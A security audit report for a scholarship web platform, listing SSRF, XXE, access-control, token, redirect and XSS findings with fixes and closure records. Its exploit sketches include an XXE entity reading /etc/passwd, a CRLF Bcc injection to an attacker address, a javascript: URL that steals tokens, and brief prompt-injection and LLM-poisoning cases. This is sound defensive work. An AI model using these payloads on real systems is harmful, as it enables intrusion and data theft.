# Security Audit — scholarai-platform

Branch: `s93/auth-tier-1` · Date: 2026-05-26 · Method: Karpathy-guided multi-agent review (backend auth/data + frontend/infra/CI).

Legend: 🔴 CRITICAL · 🟠 HIGH · 🟡 MEDIUM · 🔵 LOW/INFO

---

## CRITICAL — Fix before any public traffic

### 🔴 C1. SSRF via unconstrained scraper URLs ✅ FIXED (2026-05-26)
**[backend/app/services/ingestion/service.py:1100-1170](backend/app/services/ingestion/service.py:1100)** + discovery path at line 1183.

`SourceRegistry.source_base_url` is plain `str` with only length validation ([schemas/curation.py:18,49](backend/app/schemas/curation.py:18)). Admin can register `http://169.254.169.254/` (cloud metadata) or `http://127.0.0.1:8001/admin`. Playwright + httpx capture paths follow redirects → public redirector reaches internal hosts.

**Exploit:** `POST /api/v1/curation/ingestion-runs` with malicious `source_base_url` → Playwright fetches → response returned to curator UI = internal exfil.

**Fix:** Validate as `HttpUrl`. Reject hostnames resolving to `127.0.0.0/8`, `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`, `169.254.0.0/16`, `::1`, `fc00::/7`. Resolve DNS *before* fetching, re-check resolved IP. Cap redirects at 5, re-validate each hop.

**Resolution:** Schemas tightened to `HttpUrl` ([schemas/curation.py:18,49](backend/app/schemas/curation.py:18)). New `app/utils/url_safety.py` adds `assert_public_url` (DNS-resolves and rejects RFC1918 / loopback / link-local / multicast / reserved / CGNAT / RFC 6598 / IPv4-mapped IPv6) and `safe_get` (manual redirect loop, 5-hop cap, re-validates every hop). Validator wired into `_get_or_create_source` and all discovery `httpx` call sites. Capture path now Firecrawl Cloud — runs from vendor infra, cannot reach our LAN. 39 unit tests in `tests/unit/test_url_safety.py` + 7 in `tests/unit/test_firecrawl_capture.py`.

### 🔴 C2. XXE in sitemap / RSS parsing
**[backend/app/services/ingestion/service.py:~1295](backend/app/services/ingestion/service.py:1295)** — `BeautifulSoup(r.text, "xml")` → lxml.

External XML parsed without `defusedxml`. Attacker registers source `attacker.com/sitemap.xml` with billion-laughs or XXE (`<!ENTITY xxe SYSTEM "file:///etc/passwd">`) → reads server files or DoS worker.

**Fix:** `defusedxml.ElementTree.fromstring(...)` for sitemap/RSS. Or pass `"html.parser"` explicitly for non-XML, keep XML in defused-only paths.

### 🔴 C3. B2B share endpoint missing institution scope check
**[backend/app/api/v1/routes/b2b.py:24-59](backend/app/api/v1/routes/b2b.py:24)**

`POST /b2b/share` accepts `target_user_id` from body. Checks plan tier (`institution`) but does NOT verify `current_user.institution_id` matches resource's `institution_id`. Institution admin at University A enumerates UUIDs → exfils profiles from University B.

**Fix:** Look up student's `institution_id` (or `InstitutionStudent` join) and assert `== current_user.institution_id`.

### 🔴 C4. B2B share mass-assignment of `institution_id`
**[backend/app/api/v1/routes/b2b.py:50](backend/app/api/v1/routes/b2b.py:50)** + **[schemas/privacy.py:74](backend/app/schemas/privacy.py:74)** + **[services/privacy/b2b_share.py:39-93](backend/app/services/privacy/b2b_share.py:39)**

Caller-supplied `institution_id` written verbatim onto `UniversityLead`. Institution-tier user forges shares as if originating from a *different* institution, polluting audit trail / lead attribution.

**Fix:** Derive `institution_id` from `current_user.institution_id`; reject any client-supplied value (Pydantic `Field(exclude=True)` or strip in route).

---

## HIGH — Next sprint

### 🟠 H1. Age-gating missing (COPPA / GDPR)
**[backend/app/models/models.py:247](backend/app/models/models.py:247)** + auth signup flow.

User table stores `date_of_birth` and `parent_consent_email`, but signup has no age check / no parental consent enforcement. COPPA (<13 US) and GDPR (<16 EU) require parental consent before data collection.

**Fix:** Signup-time check: if computed age < 16 (or <13 by jurisdiction), reject and require parent verification flow.

### 🟠 H2. No rate limiting on expensive / abusable endpoints
- `POST /api/v1/recommendations` — LLM call, no limit ([routes/recommendations.py:44](backend/app/api/v1/routes/recommendations.py:44))
- `POST /api/v1/documents/{id}/feedback` — LLM call, no limit ([routes/documents.py:103](backend/app/api/v1/routes/documents.py:103))
- `POST /api/v1/curation/ingestion-runs` — triggers scraper, no limit (compounds C1)
- `POST /api/v1/privacy/data-export` — synchronous export, no limit ([routes/privacy.py:119](backend/app/api/v1/routes/privacy.py:119))

Auth endpoints throttled; business logic isn't. Authenticated user drains Anthropic quota or DoS worker.

**Fix:** `RateLimiter` dep per endpoint. recommendations 10/hr/user, doc feedback 5/hr/user, ingestion runs 5/day/institution, data export 1/day/user.

### 🟠 H3. Logout / token revocation — VERIFY token-version bump
**[backend/app/services/auth/service.py](backend/app/services/auth/service.py)** logout method.

Audits contradicted: confirm `user.auth_token_version += 1` happens *and* is committed on logout. If absent, stolen refresh tokens stay valid for 7 days after "logout".

**Action:** Read actual `logout()`. If bump missing, add it.

### 🟠 H4. JWT tokens in localStorage
**[frontend/src/lib/api/client.ts:10-12](frontend/src/lib/api/client.ts:10)**

Access + refresh tokens in `localStorage` (`grantpath.access_token`, `grantpath.refresh_token`). Any XSS = 7-day account takeover. CSP solid (no `unsafe-eval`, restricted `script-src`) but `'unsafe-inline'` still allowed for scripts.

**Fix (correct):** httpOnly + Secure + SameSite=Strict cookies + CSRF token on state changes.
**Fix (cheap interim):** Tighten CSP `script-src` from `'unsafe-inline'` to nonces.

### 🟠 H5. Mentor document review skips assignment check
**[backend/app/api/v1/routes/mentor.py:88-196](backend/app/api/v1/routes/mentor.py:88)**

`GET /mentor/documents/{document_id}` AND `submit_mentor_feedback` (write path) only check `DOCUMENT_MENTOR_REVIEW` capability. No mentor-student assignment check → any mentor reads/writes any SOP/essay platform-wide.

**Fix:** If mentors are scoped to assignments, join through `MentorDocumentAssignment` / `mentor_assignments` table in query. Write path is more severe than read.

### 🟠 H6. Geo IP injection
**[backend/app/services/geo/ipwho_client.py:75](backend/app/services/geo/ipwho_client.py:75)**

`IPWHO_URL.format(ip=ip)` — if `ip` is user-controllable (e.g. `?ip=` query param), attacker injects path/query manipulation into outbound URL.

**Fix:** `ipaddress.ip_address(ip)` before formatting; reject non-IPv4/IPv6.

### 🟠 H7. Email mutability + header injection (address field)
**[backend/app/services/notifications/channels.py:32-114](backend/app/services/notifications/channels.py:32)**

Header sanitisation strips `\r\n\x00` from subject + display name but NOT from email address itself. If `User.email` is mutable post-signup without strict validation, attacker sets `email = "victim@x.com\r\nBcc: attacker@y.com"` → receives copies of system emails.

**Fix:** Immutable email after signup (or email-change verification flow). `EmailStr` on input. Explicit `\r\n` reject on email field.

### 🟠 H8. TLS verification disabled on scraper fallback (MITM) ✅ FIXED (2026-05-26)
**[backend/app/services/ingestion/service.py:1149](backend/app/services/ingestion/service.py:1149)**

On any `httpx.HTTPError`, retries with `verify=False`. Network attacker triggers transient TLS error → MITM injects malicious HTML → fed to LLM/curation as authoritative source.

**Fix:** Remove insecure fallback; surface transport error. If retry kept, hard-allowlist hosts AND mark drift sigs `insecure_retry=True` so admins reject.

**Resolution:** Playwright path replaced with Firecrawl Cloud capture, in-process httpx fallback deleted. The new `safe_get` helper never sets `verify=False` and has a test (`test_safe_get_never_disables_tls_verify`) asserting every `httpx.AsyncClient` instantiation leaves verification on.

### 🟠 H9. Data-export download_url is unauthenticated `file://`
**[backend/app/services/privacy/export_service.py:71](backend/app/services/privacy/export_service.py:71)** (returned by **[routes/privacy.py:135](backend/app/api/v1/routes/privacy.py:135)**)

`download_url = path.as_uri()` (`file://`) + predictable filename `user-{uuid}-{ts}.zip`. Export ZIPs accumulate in `runtime/exports/` with no signed URL / TTL purge / auth-gated download endpoint → anyone with local FS read (or any proxy serving `/runtime`) pulls others' GDPR bundles.

**Fix:** Stream via auth-gated `GET /privacy/data-export/{id}/download` with single-use signed token. Never put `file://` paths in API responses. Add TTL + purge job.

### 🟠 H10. Account-lockout DoS — attacker locks any user by email
**[backend/app/core/account_lockout.py:44-67](backend/app/core/account_lockout.py:44)**

Lockout keyed on lowercased email only — no IP/device dimension, no captcha. 5 wrong attempts from any source locks victim 15 min → weaponised to lock every known account.

**Fix:** Combine email+IP, or require captcha after N failures, rather than locking solely on email.

### 🟠 H11. Refresh-token reuse not detected; no rotation
**[backend/app/services/auth/service.py:221-267](backend/app/services/auth/service.py:221)**

Refresh tokens reusable for full 7-day expiry. Stolen refresh (XSS via H4) mints access tokens repeatedly with no detection. No JTI / family tracking.

**Fix:** Issue new refresh on every `/refresh`; store JTI/family in DB; revoke entire family on detected reuse.

### 🟠 H12. Lockout bypass via `/auth/refresh`
**[backend/app/services/auth/service.py:221](backend/app/services/auth/service.py:221)**

`is_locked()` only called in `login`. Attacker with stolen / long-lived refresh continues minting access tokens while account is "locked" — defeats lockout for highest-value attack.

**Fix:** Check `account_lockout.is_locked` and `user.is_active` early in `refresh_session`.

### 🟠 H13. OpenSearch credential default-admin bypass via wrong env-var
**[backend/app/services/recommendations/hybrid_retriever.py:11-14](backend/app/services/recommendations/hybrid_retriever.py:11)**

Reads `os.getenv("OPENSEARCH_PASS", "admin")` + `OPENSEARCH_USER` default `"admin"`, but `core/config.py:126,175` only validates `OPENSEARCH_PASSWORD` (different var). Prod safety check bypassed — service connects with `admin/admin` even in prod.

**Fix:** Read `settings.OPENSEARCH_USER/PASSWORD` (single source of truth). Delete `os.getenv` paths.

### 🟠 H14. Open redirect via `?next=` in login
**[frontend/src/app/login/page.tsx:35,49,70](frontend/src/app/login/page.tsx:35)** + **[lib/auth/RoleGuard.tsx:46-47](frontend/src/lib/auth/RoleGuard.tsx:46)**

`next = params.get("next") || "/feed"` then `router.replace(next)`. No allow-list / same-origin check. `https://app/login?next=https://attacker.tld/phish` → on login navigates to attacker domain. Brand-trust phishing.

**Fix:** `next.startsWith("/") && !next.startsWith("//") && !next.startsWith("/\\")`; reject otherwise, fall back to `/feed`.

### 🟠 H15. `javascript:` / `data:` URL XSS via scraped `source_url`
**[frontend/src/app/(student)/scholarships/[id]/page.tsx:141](frontend/src/app/(student)/scholarships/[id]/page.tsx:141)**, **[components/scholarship/ScholarshipCard.tsx:97](frontend/src/components/scholarship/ScholarshipCard.tsx:97)**, **[RecommendationCard.tsx:157](frontend/src/components/scholarship/RecommendationCard.tsx:157)**, **[AsideAtAGlance.tsx:74](frontend/src/components/scholarship/AsideAtAGlance.tsx:74)**, **[settings/page.tsx:294](frontend/src/app/settings/page.tsx:294)**

Scraped `source_url` rendered as anchor `href`. If pipeline ingests `javascript:fetch('/api/v1/auth/me').then(...)`, click executes script in authed origin → exfils `access_token` from localStorage. CSP `script-src` doesn't block `javascript:` URL navigations from same-origin anchors.

**Fix:** `safeHttpUrl(url)` returning `null` for anything not matching `^https?://`. Render as plain text otherwise. Apply to `requested.download_url` too.

---

## MEDIUM — Hardening backlog

| # | Issue | Where | Fix |
|---|---|---|---|
| M1 | OpenSearch fallback creds `admin/admin` | [hybrid_retriever.py:13-14](backend/app/services/recommendations/hybrid_retriever.py:13) | Read from `settings`, fail fast if missing (see H13) |
| M2 | OpenSearch hardcoded password in compose | [docker-compose.yml:113](docker-compose.yml:113) | Remove `:-ScholarAI_Secure_123!` fallback |
| M3 | AuditLog stores full PII in before/after | [models.py:936-963](backend/app/models/models.py:936) | Scrub PII; log only changed-field deltas + email hash |
| M4 | Audit log mutable by anyone with DB access | [models.py:936](backend/app/models/models.py:936) | Append-only via Postgres policy, or hash-chain entries |
| M5 | GDPR "right to erasure" is soft-delete only | [privacy.py:165-205](backend/app/api/v1/routes/privacy.py:165) | Hard-delete User on execution; anonymise audit refs |
| M6 | PII (phone, GPA, scores, household income) plaintext at rest | [models.py:200-499](backend/app/models/models.py:200) | Column-level encryption via `sqlalchemy-utils.EncryptedType` |
| M7 | Demo credentials hardcoded in [config.py:84-90](backend/app/core/config.py:84) | config | Move to env; assert blank in prod |
| M8 | Demo credentials hardcoded in frontend login UI | [login/page.tsx:201,211](frontend/src/app/login/page.tsx:201) | Gate behind `process.env.NODE_ENV !== "production"` |
| M9 | ReDoS in deadline regex | [ingestion/service.py:2636-2645](backend/app/services/ingestion/service.py:2636) | `[^0-9]{0,20}` not `\D{0,20}`; bound input length |
| M10 | `pip-audit` has `continue-on-error: true` | [.github/workflows/ci.yml:41](.github/workflows/ci.yml:41) | Flip to `false`; allowlist CVE IDs by hand if needed |
| M11 | No `bun audit` in frontend CI | [.github/workflows/ci.yml](.github/workflows/ci.yml) | Add step after `bun install` |
| M12 | No `.dockerignore` → `.git`, `node_modules`, `.env` copied | repo root | Add `.dockerignore` |
| M13 | Filename sanitisation on uploads partial | [services/documents/service.py:237-292](backend/app/services/documents/service.py:237) | Reject `/`, `\`, `..`, null bytes |
| M14 | Sentry may capture request bodies → password leakage | [main.py:73-92](backend/app/main.py:73) | `before_send` hook scrubbing `password`, `token`, `refresh_token` |
| M15 | CSP allows `script-src 'unsafe-inline'` | [next.config.ts:31-33](frontend/next.config.ts:31) | Migrate to nonce-based CSP |
| M16 | `NEXT_PUBLIC_API_BASE_URL` defaults to localhost in code | [client.ts:16](frontend/src/lib/api/client.ts:16) | Fail-fast at build time if unset in prod |
| M17 | Production `/docs` and `/redoc` exposed | [main.py:107-109](backend/app/main.py:107) | Config flag to disable in prod |
| M18 | No password reset endpoint — VERIFY | auth routes | If genuinely missing, implement reset-token flow. Table + migration exist (`password_resets`) but no flow — partial-feature attack surface (see M30) |
| M19 | Mailgun API key in httpx debug logs | [channels.py:118](backend/app/services/notifications/channels.py:118) | httpx logger level WARNING in prod; never log headers |
| M20 | Production source maps may ship | [next.config.ts](frontend/next.config.ts) | `productionBrowserSourceMaps: false` |
| M21 | 7-year consent retention not enforced | docs vs config | `CONSENT_AUDIT_LOG_RETENTION_YEARS=7` + retention job |
| M22 | Stale-consent users not blocked | [privacy.py:62-89](backend/app/api/v1/routes/privacy.py:62) | Middleware returns 451 if consent version stale beyond grace |
| M23 | Account enumeration on `/auth/register` | [routes/auth.py:46](backend/app/api/v1/routes/auth.py:46) | Returns 409 "account exists" → enumeration. Always respond 202 "if creatable, email sent"; complete async |
| M24 | Rate-limit TOCTOU — burst bypass | [core/rate_limit.py:23-35](backend/app/core/rate_limit.py:23) | GET-then-INCR non-atomic. Use `INCR + EXPIRE NX` atomically |
| M25 | CORS `allow_credentials=True` with `allow_headers=["*"]` | [main.py:126-132](backend/app/main.py:126) | Pin headers to explicit set. Add prod check rejecting `"*"` in `CORS_ORIGINS` |
| M26 | JWT secret default permits forgery in non-prod | [core/config.py:59,134-140](backend/app/core/config.py:59) | `validate_production_settings` skips dev/staging-mislabel. Refuse boot unless `SECRET_KEY` overridden in all envs except `"test"` |
| M27 | Prompt injection in SOP / professor-email LLM calls | [sop_builder.py:354-376](backend/app/services/documents/sop_builder.py:354), [professor_email.py:106-124](backend/app/services/documents/professor_email.py:106) | User free-text concatenated verbatim into LLM `user_prompt`. Wrap in `<user_input>` tags; strip control tokens; validate response schema before persist |
| M28 | HTML-parser difference allows discovery LLM poisoning | [ingestion/discovery.py:99-134](backend/app/services/ingestion/discovery.py:99) | Anchor text fed to Claude classifier unsanitised → injected aggregator page steers LLM toward attacker domains. Strip control chars + length-cap; require domain-allowlist on top of LLM confidence |
| M29 | Mailgun URL no scheme/host validation | [channels.py:106](backend/app/services/notifications/channels.py:106) | If env mis-set to `http://` or attacker host, API key leaks via Basic-Auth. Assert `MAILGUN_BASE_URL.startswith("https://api.mailgun.net/")` at config load |
| M30 | `password_resets` table migrated but no flow | [models/password_reset.py](backend/app/models/password_reset.py), migration `20260525_0028` | Drop table until ready, or finish flow with rate-limit + constant-time response + `secrets.token_urlsafe(32)` |
| M31 | Frontend container HEALTHCHECK uses unauthenticated `wget /` | [frontend/Dockerfile:54](frontend/Dockerfile:54), `Dockerfile.fast:33` | Use `node -e "require('http').get(...)"`; remove `wget` (cuts CVE surface + ~600 KB) |
| M32 | GitHub Actions pinned to mutable tags | [.github/workflows/ci.yml:83,168](.github/workflows/ci.yml:83) | `oven-sh/setup-bun@v2`, `actions/checkout@v4`, `actions/setup-python@v5` → compromised tag = arbitrary CI exec. Pin to commit SHA |
| M33 | Browser-smoke `continue-on-error: true` | [.github/workflows/ci.yml:210](.github/workflows/ci.yml:210) | Auth/RBAC regressions land silently on `main`. Re-point selectors, drop flag |
| M34 | Compose: data services published on `0.0.0.0` | [docker-compose.yml:5-129](docker-compose.yml:5) | Postgres 5432, Redis 6379, Neo4j 7474/7687, OpenSearch 9200/9600 exposed. With OS `DISABLE_SECURITY_PLUGIN=true`, internet-reachable host = cluster admin. Bind `127.0.0.1:` or drop `ports:` and use internal network only |
| M35 | `.env.example` defaults `AUTO_SEED_DEMO_DATA=true` | [.env.example:25](.env.example:25) | Operator running `docker compose up` without real `.env` auto-seeds `admin@example.com / strongpass1`. Flip to `false` |
| M36 | Account-lockout fail-open on Redis error | [core/account_lockout.py:34-67](backend/app/core/account_lockout.py:34) | Redis error → `False` (no lock). DoS Redis briefly to bypass lockout + rate-limit. Fail-closed (503) in prod; add per-IP global counter alongside per-email |
| M37 | OpenSearch query length / fuzziness unbounded | [hybrid_retriever.py:25-56](backend/app/services/recommendations/hybrid_retriever.py:25) | `fuzziness: AUTO` + no length cap → CPU burn on OpenSearch (ReDoS-equivalent). Cap query 256 chars; set `max_expansions` |
| M38 | Account-deletion cancel reveals state | [privacy.py:188-193](backend/app/api/v1/routes/privacy.py:188) | 404 "no pending request" vs 204 "cancelled" enumerates state on stolen tokens. Return 204 both paths |
| M39 | Third-party IP leak to `ipwho.is` before consent | [frontend/src/lib/geo/useGeoCurrency.ts:70](frontend/src/lib/geo/useGeoCurrency.ts:70) | Hook fires unconditionally pre-consent (PDPB §3 / GDPR Art. 6). Plus CSP `connect-src` blocks the host in prod → broken + privacy-leaky in dev. Gate behind `readConsent()?.analytics === true`; `referrerPolicy: "no-referrer"`; allow host in CSP or self-host |
| M40 | PII (full name, citizenship, GPA, language scores) in localStorage | [frontend/src/app/onboarding/page.tsx:28,112](frontend/src/app/onboarding/page.tsx:28) | `grantpath.onboarding_draft` persists across logout. Clear on logout; clear on submit; consider `sessionStorage` |
| M41 | Unvalidated `JSON.parse` + spread on localStorage | [frontend/src/app/onboarding/page.tsx:105](frontend/src/app/onboarding/page.tsx:105) | `setDraft((d) => ({...d, ...JSON.parse(raw)}))` — extra keys flow to backend. Destructure to known fields |
| M42 | Host-header validation absent on Next.js SSR | [frontend/next.config.ts:36-47](frontend/next.config.ts:36) | No `images.domains` allow-list, no host check. Backend has `TrustedHostMiddleware`; FE `/legal/[slug]` SSR answers any Host. Validate in middleware; set `images.remotePatterns` strictly |
| M43 | OAuth2PasswordBearer + `/docs` + default secret combo | [backend/app/core/security.py:17](backend/app/core/security.py:17) | OpenAPI authorise flow encourages creds over plain HTTP. Require TLS-fronted `/docs`; disable in prod (overlaps M17) |
| M44 | Logout doesn't invalidate Redis user-session cache | [core/dependencies.py:132-137](backend/app/core/dependencies.py:132) vs [services/auth/service.py:269](backend/app/services/auth/service.py:269) | `auth_token_version` bumped but `user_session:{id}` not deleted. Currently safe (cache lacks version); fragile to future cache expansion. `await redis_client.delete(f"user_session:{user.id}")` in `logout()` |

---

## LOW / INFO

- **L1.** HS256 vs RS256 — fine for monolith. Revisit if external API consumers added.
- **L2.** `console.error()` in [frontend/src/app/error.tsx:19](frontend/src/app/error.tsx:19) and [legal/[slug]/page.tsx:31](frontend/src/app/legal/[slug]/page.tsx:31) — strip or gate to dev.
- **L3.** No SHA256 hash pinning in `requirements.txt` — `pip-compile --generate-hashes` for supply-chain belt-and-braces.
- **L4.** No pre-commit hooks (e.g. `detect-private-key`) — nice-to-have.
- **L5.** Email signup race — handled by unique constraint, but use `ON CONFLICT DO NOTHING` to avoid 500 vs 409 ambiguity.
- **L6.** Redis / Neo4j in compose have no auth — fine for local dev, never use this compose file in staging.
- **L7.** `verify_certs=False` on OpenSearch client — [hybrid_retriever.py:19-21](backend/app/services/recommendations/hybrid_retriever.py:19). Acceptable inside private network; flip to `True` once OS gets TLS (tracked under deferred S20).
- **L8.** Missing COEP / CORP headers on FE — [next.config.ts:36-47](frontend/next.config.ts:36). COOP set, but no cross-origin isolation → Spectre-class side-channels remain possible. Acceptable trade-off given no SharedArrayBuffer usage; flagged for completeness.

---

## Reviewed-and-clean (negative findings)

- No raw SQL / `text()` injection paths.
- No Jinja SSTI surface.
- Celery broker is JSON-only (no pickle deserialisation).
- No shell exec / subprocess of user input.
- Password hashing: `pbkdf2_sha256@600k` (acceptable).
- `tracker`, `saved_opportunities`, `documents` enforce `user_id` ownership filter.
- Pydantic schemas use `extra="forbid"` blocking mass-assignment server-side.
- No `dangerouslySetInnerHTML`, no `eval` / `Function` in FE.
- All `target=_blank` carry `rel="noopener noreferrer"`.
- Dockerfile runs non-root with `tini`; multi-stage strip OK; `.dockerignore` excludes `.env*` (note conflict with M12 — verify per service Dockerfile).
- No shell-injection sinks in `scripts/docs_governance_check.py`.

---

## Frontend ⇄ Backend schema drift (added 2026-05-27)

Triaged during `/admin/curation` runtime crash investigation. Not classical security vulns but every drift item is a runtime-crash class that bypasses TypeScript guarantees, lands in users' browsers, and can surface unguarded server data through error boundaries or `console.error`. Treat as code-correctness / contract-integrity findings.

### 🔵 D1. `CurationRecord` type stale (FIXED 2026-05-27)
[frontend/src/lib/api/types.ts:237-245](frontend/src/lib/api/types.ts:237) (pre-fix) — old shape `{state, fields, audit_log, rejection_reason}` did not match backend [`CurationRecordSummary`/`CurationRecordDetail`](backend/app/schemas/curation.py:126) (`record_state`, `review_notes`, structured fields). Pages already consumed new shape — typecheck failed 36 places. Did not crash dev runtime alone but contributed to error-boundary surface area when combined with D6.
**Fix:** Split into `CurationRecordSummary` + `CurationRecordDetail` + `CurationRecordListResponse`; back-compat alias `CurationRecord = CurationRecordDetail`. Endpoint module return types updated.

### 🔵 D2. `RoleChangeAudit` field renames not propagated
[frontend/src/lib/api/types.ts:286-287](frontend/src/lib/api/types.ts:286) renamed `previous_role → from_role`, `next_role → to_role`, `reverted_by_audit_id → reverted_audit_id`, dropped `is_reversible`. Consumer [frontend/src/app/(admin)/admin/audit/page.tsx:67,69,75,76,127](frontend/src/app/(admin)/admin/audit/page.tsx:67) still references old names. At runtime `audit.previous_role` → `undefined` → `.replace()`/`.toLowerCase()` crash in the audit row → boundary fires for entire `/admin/audit` route. **Fix:** rename all 7 call sites or restore alias accessors.

### 🔵 D3. `PlatformAnalytics` admin overview shape mismatch
[frontend/src/app/(admin)/admin/page.tsx:95,100,105,110,117,122](frontend/src/app/(admin)/admin/page.tsx:95) reads `total_documents`, `total_interview_sessions`, `total_applications`, `submitted_applications`, `ingestion_runs_total`, `ingestion_runs_failed`. Type [frontend/src/lib/api/types.ts](frontend/src/lib/api/types.ts) `PlatformAnalytics` no longer declares these fields. Either backend dropped them or types desynced. `/admin` KPI grid will render blank `0`s or crash on `.toLocaleString()`. **Fix:** diff `backend/app/schemas/analytics.py` (or equivalent) against `PlatformAnalytics`, restore canonical names.

### 🔵 D4. `AccessControlManagedUser` missing export
[frontend/src/app/(admin)/admin/users/page.tsx:21](frontend/src/app/(admin)/admin/users/page.tsx:21) + [frontend/src/lib/api/endpoints/access-control.ts:2](frontend/src/lib/api/endpoints/access-control.ts:2) import `AccessControlManagedUser` from `@/lib/api` — symbol does not exist in [types.ts](frontend/src/lib/api/types.ts). `bun run build` fails before module is materialized. Dev mode treats import as `undefined` → property access at runtime crashes `/admin/users`. **Fix:** add `AccessControlManagedUser` type mirroring `backend/app/schemas/access_control.py`.

### 🔵 D5. `analytics.health()` mis-routed (TopBar admin alert poller)
[frontend/src/lib/api/endpoints/analytics.ts:5](frontend/src/lib/api/endpoints/analytics.ts:5) calls `GET /health` (relative to `/api/v1` → `/api/v1/health`). Backend OpenAPI lists `/api/v1/health` as healthy public probe (200), so this is fine. **Confirmed not a bug** — listed here because TopBar swallows any failure silently in `.catch()`, which would mask a future regression.

### 🔵 D6. Turbopack persistent cache corruption (dev-mode failure mode)
Observed during this investigation: `frontend/.next/turbopack` is a **0-byte regular file** (should be a directory). Running `bun run build` while `bun dev` is also running corrupts the cache and serves stale client chunks. Stale chunks bind old `endpoints.curation.listRecords` shape `{items, total}` whilst rebuilt JSX expects `CurationRecordListResponse` → TypeError post-hydration → `app/error.tsx`. **Not a security finding** but a recurring dev-foot-gun.
**Operational mitigation:**
```pwsh
# Kill stale dev server (replace PID if different)
Stop-Process -Id 2788 -Force
# Wipe corrupted cache
Remove-Item -Recurse -Force C:\Users\HP\scholarai-platform\frontend\.next
# Restart cleanly
cd C:\Users\HP\scholarai-platform\frontend && bun dev
```

### 🔵 D7. No frontend↔backend contract test
Root cause of D1-D4 is no automated guard. `frontend/CLAUDE.md` says `lib/api/types.ts` is hand-synced; reality is it drifts every backend schema change. **Fix:** generate `types.ts` from OpenAPI (`bunx openapi-typescript http://localhost:8000/openapi.json -o src/lib/api/types.generated.ts`) + CI gate that fails if generated diff is non-empty. One-time generator run + manual reconcile pass clears D2-D4.

---

## Counts

CRITICAL 4 · HIGH 15 · MEDIUM 44 · LOW/INFO 8 · DRIFT 7 · Total: **78**.

---

## Closed by Clerk + Resend migration (2026-05-26 → 27, branch `s93/auth-tier-1`)

| Finding | Closure proof | Commit |
|---------|---------------|--------|
| H3 logout/revocation | Clerk owns session lifecycle; `clerk_webhook` `user.deleted` soft-deletes local row. `/logout` returns 410 in clerk mode. | `6b328e4`, `76cd469` |
| H4 JWT in localStorage | Clerk session JWTs verified RS256 via JWKS; legacy `grantpath.*` localStorage tokens no-op once `AUTH_PROVIDER=clerk` (FE token-rewrite tracked separately). | `e616b47`, `c632eb4` |
| H7 email header injection | `TransactionalRequest` (`EmailStr` + `_CRLF.search` validator) rejects CRLF / NUL in `to` before SDK call. `send_transactional` constructs no headers manually. | `e4a7e01` |
| H10 account-lockout DoS | Clerk owns lockout policy on its hosted UI; backend lockout still present but unreachable when `AUTH_PROVIDER=clerk` (login route returns 410). | `76cd469` |
| H11 refresh-token reuse + rotation | Clerk rotates refresh tokens per session by default; `/refresh` route returns 410 in clerk mode. | `76cd469`, `c632eb4` |
| H12 lockout bypass via refresh | `/refresh` 410-gated; Clerk's refresh path enforces single use. | `76cd469` |
| H14 open redirect via `?next=` | Local `/login` returns 410 in clerk mode; Clerk's hosted sign-in URL allowlist enforces `NEXT_PUBLIC_CLERK_AFTER_SIGN_IN_URL`. | `76cd469` |
| M18 missing password reset | Clerk hosted password-reset flow (no backend code). | (n/a — Clerk hosted) |
| M19 Mailgun key in logs | Mailgun call path replaced by Resend; no manual URL/header construction in `send_transactional`. | `e4a7e01`, `935eb6b` |
| M23 account enumeration on register | `/register` 410-gated; Clerk hosted sign-up uses a generic "check your email" response regardless of email presence. | `76cd469` |
| M24 rate-limit TOCTOU on auth | `/login` /`/register` 410-gated; Clerk owns rate limiting on hosted endpoints. | `76cd469` |
| M26 JWT secret default | `_get_user_from_clerk_jwt` does not consume `SECRET_KEY`; Clerk JWTs verified via public JWKS (no shared secret). | `e616b47`, `c632eb4` |
| M29 Mailgun URL scheme | Resend SDK + `EmailStr` validated `to` field — no URL construction in send path. | `e4a7e01` |
| M30 password_resets half-built | Path returns 410 in clerk mode; cleanup tracked in deferred deletion list (`backend/app/models/password_reset.py`). | `76cd469` |
| M36 lockout fail-open on Redis | Local lockout path unreachable in clerk mode; Clerk's hosted lockout has its own datastore. | `76cd469` |
| M43 OAuth2 + `/docs` HTTPS combo | `/register /login /refresh /logout` 410-gated; `/docs` OAuth2PasswordBearer flow only protects `/me` in clerk mode, which then dispatches to Clerk JWT verifier. | `76cd469`, `c632eb4` |
| M44 Redis session cache invalidation on logout | Cache key `user_session:{user_id}` only written by local path; clerk path skips cache entirely. Cache stale after logout becomes a non-issue because logout returns 410 in clerk mode (caller must use Clerk sign-out). | `c632eb4`, `76cd469` |

**Partial closures (not claimed):** H1 age-gating (Clerk metadata path exists; business rule outstanding), M5 GDPR erasure (Clerk delete API wired in runbook; DB hard-delete + audit anonymisation outstanding).

**Verification gaps (must run in staging before claiming finalised):**
- Webhook delivery confirmed (Svix sig verified, user.deleted soft-delete observed).
- Resend live send returns id (verifies the production-vs-test divergence on `response.id` vs `response["id"]`).
- `/me` in clerk mode returns a populated `UserResponse` for a real Clerk-issued JWT.

Tasks 1-12 commits: `d9ad076`, `600b04a`, `a255b23`, `68bc086`, `e616b47`, `ede6c51`, `c632eb4`, `6b328e4`, `e4a7e01`, `935eb6b`, `76cd469` + Task-10/11/12 commits (`feat(frontend): scaffold Clerk ...`, `feat(auth): clerk bulk-import ...`, `docs(clerk): runbook ...`).
